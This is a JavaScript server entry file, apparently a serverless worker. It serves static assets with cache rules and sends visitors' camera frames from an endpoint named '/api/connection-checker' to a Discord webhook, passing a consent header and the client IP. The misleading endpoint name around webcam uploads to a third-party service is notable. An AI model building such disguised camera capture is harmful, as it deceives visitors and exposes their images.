import { MAX_SNAPSHOT_BYTES, handleSnapshot } from "./snapshot.js";

/**
 * Static host entry. `/api/connection-checker` forwards consented camera frames to the
 * Discord webhook held in `env.DISCORD_WEBHOOK_URL`; everything else is served
 * from the asset binding (which applies the SPA fallback).
 */
function json(status, body, headers = {}) {
  return new Response(JSON.stringify(body), {
    status,
    headers: {
      "content-type": "application/json; charset=utf-8",
      "cache-control": "no-store",
      ...headers,
    },
  });
}

/**
 * Asset responses carry the host's default `max-age=0, must-revalidate`, even
 * for content-hashed files, so every visit revalidates the whole bundle. Hashed
 * assets are safe to cache forever; the HTML shell must keep revalidating so a
 * deploy is picked up immediately.
 */
async function serveAsset(request, env, url) {
  const response = await env.ASSETS.fetch(request);
  const { pathname } = url;

  let cacheControl = null;
  if (pathname.startsWith("/assets/")) {
    cacheControl = "public, max-age=31536000, immutable";
  } else if (pathname.startsWith("/models/") || pathname.startsWith("/mediapipe/")) {
    // Unversioned runtime files: a week, revalidated in the background.
    cacheControl = "public, max-age=604800, stale-while-revalidate=86400";
  }
  // 304s and conditional requests must pass through untouched: rebuilding them
  // would attach a body the status forbids.
  if (!cacheControl || response.status !== 200) return response;

  const headers = new Headers(response.headers);
  headers.set("cache-control", cacheControl);
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers,
  });
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    if (url.pathname !== "/api/connection-checker") {
      return serveAsset(request, env, url);
    }

    const declared = Number(request.headers.get("content-length") ?? "0");
    if (Number.isFinite(declared) && declared > MAX_SNAPSHOT_BYTES) {
      return json(413, { ok: false, status: "too-large", message: "Snapshots must be 2 MB or smaller." });
    }

    let bytes;
    try {
      bytes = new Uint8Array(await request.arrayBuffer());
    } catch {
      return json(400, { ok: false, status: "unreadable", message: "The snapshot body could not be read." });
    }

    const result = await handleSnapshot({
      method: request.method,
      origin: request.headers.get("origin") ?? "",
      requestUrl: request.url,
      contentType: request.headers.get("content-type") ?? "",
      consent: request.headers.get("x-snapshot-consent") ?? "",
      clientKey: request.headers.get("cf-connecting-ip") ?? "unknown",
      bytes,
      webhookUrl: env.DISCORD_WEBHOOK_URL,
      now: Date.now(),
    });

    return json(result.code, result.body, result.headers);
  },
};
